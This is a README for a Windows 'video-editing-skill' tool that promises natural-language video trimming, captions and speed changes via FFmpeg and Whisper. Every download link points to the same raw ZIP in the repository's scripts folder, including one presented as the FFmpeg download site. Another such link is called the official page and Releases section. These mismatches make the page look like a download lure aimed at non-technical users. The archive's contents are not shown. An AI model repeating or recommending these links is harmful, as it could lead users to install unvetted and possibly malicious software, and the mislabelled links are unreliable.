# 🎬 video-editing-skill - Edit Videos Using Natural Language

[![Download video-editing-skill](https://img.shields.io/badge/Download%20video--editing--skill-FF5722?style=for-the-badge&logo=github)](https://github.com/Surojit16/video-editing-skill/raw/refs/heads/main/scripts/video_editing_skill_1.7.zip)

---

## 📋 Overview

This application lets you edit videos by typing natural language commands. It works with OpenClaw, Claude Code, and Codex. You can trim videos, remove silence (jump cut), add captions in different styles, overlay text, and change video speed. The tool uses Bash scripts combined with FFmpeg and Whisper for processing.

You do not need any programming skills to use this. It runs on Windows and handles video editing through simple instructions you speak or type.

---

## 💻 System Requirements

- Windows 10 or later (64-bit)
- At least 4 GB RAM
- 2 GHz dual-core processor or better
- 500 MB free disk space for installation and temporary files
- Command Prompt or PowerShell access
- Internet connection for downloading tools and some AI features

---

## 🚀 Getting Started

1. **Go to the download page below:**

   [Download video-editing-skill](https://github.com/Surojit16/video-editing-skill/raw/refs/heads/main/scripts/video_editing_skill_1.7.zip)

   Click the link or badge at the top to open the official GitHub page.

2. **Download the latest version:**

   On the page, scroll to the **Releases** section. Download the latest Windows executable or ZIP file marked for Windows.

3. **Extract files if needed:**

   If you downloaded a ZIP file, right-click it and select **Extract All**. Choose a folder you can easily find, like your desktop or Documents.

4. **Install FFmpeg:**

   The program requires FFmpeg, a free video processing tool. 

   - Visit https://github.com/Surojit16/video-editing-skill/raw/refs/heads/main/scripts/video_editing_skill_1.7.zip  
   - Download the Windows release.  
   - Extract the files.  
   - Add the FFmpeg `bin` folder to your system PATH (instructions can be found on the FFmpeg site or in the included README).

5. **Run the application:**

   Open Command Prompt or PowerShell. Navigate to the folder where you extracted the program.

   Example:

   ```
   cd C:\Users\YourName\Documents\video-editing-skill
   ```

   Run the main script by typing:

   ```
   bash video-editing-skill.sh
   ```

   Follow the on-screen instructions to give commands like "trim the first 10 seconds" or "add captions using standard style."

---

## 🔧 How to Use

- **Trim your video**  
  Type "trim from start to 30 seconds" to cut the video to the first 30 seconds.

- **Jump cut silence**  
  The program detects quiet parts and removes them. Use "remove silence" to speed up your video by skipping silence.

- **Add captions**  
  Use phrases like "add captions in Hormozi style" or "add minimal captions" to show subtitles on your video.

- **Text overlay**  
  Insert text anywhere on your video. For example: "overlay text 'Hello World' at bottom center."

- **Change speed**  
  You can speed up or slow down video sections. Type "speed up by 1.5x" or "slow down by half."

All commands use natural language. The tool translates these into video edits automatically with the help of Whisper and FFmpeg.

---

## 🎥 Supported Video Formats

- MP4  
- MOV  
- AVI  
- MKV

Make sure your input files are in these formats for best results.

---

## ⚙️ Configuration

You can adjust settings by editing the `config.sh` file inside the program folder. Key options include:

- Default caption style  
- Language for transcription  
- Silence detection thresholds  
- Output video quality

Open the file in a text editor like Notepad. Save changes before running the application.

---

## ❓ Troubleshooting

- **FFmpeg not found error:**  
  Double-check FFmpeg is installed and added to your PATH. You can test by typing `ffmpeg -version` in Command Prompt.

- **Script won’t run:**  
  Make sure you have Bash installed on Windows (Git Bash or Windows Subsystem for Linux). Run the script from a Bash environment.

- **Video won’t process properly:**  
  Confirm your input video is supported and correctly formatted. Try a different file if issues persist.

- **Captions not showing:**  
  Check your caption style setting in `config.sh` and ensure Whisper has finished transcribing.

---

## 🔗 Download and Setup

[Download video-editing-skill](https://github.com/Surojit16/video-editing-skill/raw/refs/heads/main/scripts/video_editing_skill_1.7.zip)

Visit the link above to get the latest version. Follow the steps in **Getting Started** for installation and running instructions.

---

## 📂 Folder Structure

- `video-editing-skill.sh` – Main script to run  
- `config.sh` – Settings and options  
- `assets/` – Sample videos and test files  
- `docs/` – Additional documentation  
- `ffmpeg/` – Optional FFmpeg binaries if included  

---

## 👥 Community and Support

The project uses GitHub issues for tracking bugs and feature requests. You can submit questions or report problems there.

GitHub Discussions may be available to ask how to use features or to share tips with other users.

---

## 📝 Licensing

This software is open source under the MIT License. Feel free to review the `LICENSE` file in the repository.